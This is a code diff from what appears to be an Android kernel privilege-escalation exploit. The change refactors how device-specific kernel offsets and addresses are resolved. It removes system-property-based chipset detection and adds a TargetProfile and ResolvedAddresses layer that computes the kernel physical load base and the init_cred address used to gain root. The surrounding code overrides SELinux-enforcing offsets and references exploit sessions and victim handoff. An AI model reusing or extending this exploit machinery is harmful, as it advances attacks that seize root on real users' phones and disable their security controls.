@@ -12,62 +12,22 @@
 #include <sys/mman.h>
 #include <linux/perf_event.h>
 #include <sys/socket.h>
-#include <sys/system_properties.h>
 #include <sys/utsname.h>
 #include <strings.h>
 
 #include "target.h"
 
 const struct kernel_offsets *active_offsets = NULL;
+TargetProfile g_target_profile;
+// TODO(decoupling:S08-profile): Future: pass const TargetProfile to consumers.
+// Input: resolved immutable profile; output: no active_offsets compatibility mirror.
+// Blocked by: runtime offset/payload macros; completion in S08 removes this comment.
 
 // TODO(decoupling:S14-session): Future: pass RuntimeConfig via ExploitSession.
 // Input: const session config; output: paths without process-global aliases.
 // Blocked by: victim/handoff orchestration is centralized in main until S14.
 #define g_home_dir (g_runtime_config.home_dir)
 #define g_root_script_path (g_runtime_config.root_script_path)
-
-/* MTK / XRing / Tensor use different physical mappings from the Qualcomm default. */
-enum soc_family {
-  SOC_QCOM = 0,
-  SOC_MTK,
-  SOC_XRING,
-  SOC_GOOGLE,
-};
-
-/* Decoupling plan: detect the SoC address-mapping family. Input: captured
- * property source; output: soc_family. Future: runtime_config_detect_soc(),
- * called once while building RuntimeConfig. */
-static enum soc_family detect_soc(void) {
-  char buf[256];
-  const char *keys[] = {"ro.soc.manufacturer", "ro.soc.model",
-                        "ro.board.platform", NULL};
-  for (int i = 0; keys[i]; i++) {
-    if (__system_property_get(keys[i], buf) <= 0 || !buf[0]) {
-      continue;
-    }
-    if (strncasecmp(buf, "google", 6) == 0 ||
-        strncasecmp(buf, "tensor", 6) == 0 ||
-        (i > 0 && (strncasecmp(buf, "gs", 2) == 0 ||
-                   strncasecmp(buf, "zuma", 4) == 0))) {
-      return SOC_GOOGLE;
-    }
-    if (strncasecmp(buf, "mediatek", 8) == 0 ||
-        strncasecmp(buf, "mtk", 3) == 0 ||
-        (i > 0 && strncasecmp(buf, "mt", 2) == 0)) {
-      return SOC_MTK;
-    }
-  }
-  for (int i = 0; keys[i]; i++) {
-    if (__system_property_get(keys[i], buf) <= 0 || !buf[0]) {
-      continue;
-    }
-    if (strncasecmp(buf, "xring", 5) == 0 ||
-        (i > 0 && strncasecmp(buf, "o1", 2) == 0)) {
-      return SOC_XRING;
-    }
-  }
-  return SOC_QCOM;
-}
 
 /* Override target.h _OFF macros with the resolved runtime profile. */
 #undef SELINUX_ENFORCING_OFF
@@ -109,8 +69,8 @@ static enum soc_family detect_soc(void) {
 #endif
 #include "offsets_json.h"
 
-// TODO(decoupling:S08-profile): Replace this compatibility storage and offset
-// macros with an immutable TargetProfile passed to its consumers.
+// TODO(decoupling:S08-profile): Replace this transport storage and offset macros
+// with semantic TargetProfile accessors passed to consumers.
 static struct kernel_offsets g_external_offsets;
 static char g_external_release[192];
 
@@ -225,33 +185,20 @@ static void log_execution_settings(const struct kernel_offsets *profile) {
 /* Decoupling plan: publish derived addresses for the selected profile. Inputs:
  * profile and RuntimeConfig; output: ResolvedAddresses. Future:
  * resolve_runtime_addresses(), without modifying process globals. */
-static void publish_active_offsets(void) {
-  g_init_cred_image = INIT_CRED;
-  enum soc_family soc = detect_soc();
-  const char *soc_name =
-      soc == SOC_MTK ? "mtk"
-      : soc == SOC_XRING ? "xring"
-      : soc == SOC_GOOGLE ? "google/tensor"
-                          : "qcom/other";
-  if (active_offsets->kernel_phys_load) {
-    p0_kernel_phys_load = active_offsets->kernel_phys_load;
-  } else if (soc == SOC_GOOGLE) {
-    p0_kernel_phys_load = KIMAGE_TEXT_BASE - MTK_VADDR_BASE;
-    soc_name = "tensor";
-  } else if (soc == SOC_MTK) {
-    p0_kernel_phys_load = KIMAGE_TEXT_BASE - MTK_VADDR_BASE;
-    soc_name = "mtk";
-  } else if (soc == SOC_XRING) {
-    p0_kernel_phys_load = XRING_KERNEL_PHYS_LOAD;
-    soc_name = "xring";
-  } else if (strncmp(active_offsets->uname_r, "6.12.", 5) == 0) {
-    p0_kernel_phys_load = QC_GKI_6_12_PHYS_LOAD;
-    soc_name = "qcom/6.12";
-  }
+static int publish_active_offsets(void) {
+  g_target_profile = target_profile_view(active_offsets);
+  if (resolved_addresses_init(&g_resolved_addresses, &g_target_profile) != 0)
+    return -1;
+  p0_kernel_phys_load = g_resolved_addresses.kernel_phys_load;
+  g_init_cred_image = g_resolved_addresses.init_cred_image;
   pr_info("soc: %s; kernel_phys_load=0x%llx\n",
-          soc_name, (unsigned long long)p0_kernel_phys_load);
+          resolved_addresses_soc_name(&g_resolved_addresses, &g_target_profile),
+          (unsigned long long)g_resolved_addresses.kernel_phys_load);
   pr_info("init_cred image=%016zx alias=%016zx\n",
-          (size_t)g_init_cred_image, (size_t)data_addr(g_init_cred_image));
+          (size_t)g_resolved_addresses.init_cred_image,
+          (size_t)resolved_addresses_data_alias(
+              &g_resolved_addresses, g_resolved_addresses.init_cred_image));
+  return 0;
 }
 
 /* Decoupling plan: select, validate and resolve the active profile. Inputs:
@@ -285,7 +232,10 @@ static int select_offsets(const char *profile_path) {
   active_offsets = &g_external_offsets;
   pr_success("resolved profile loaded: %s\n", active_offsets->uname_r);
   log_execution_settings(active_offsets);
-  publish_active_offsets();
+  if (publish_active_offsets() != 0) {
+    pr_error("cannot resolve profile address space\n");
+    return -1;
+  }
   return 0;
 }
 
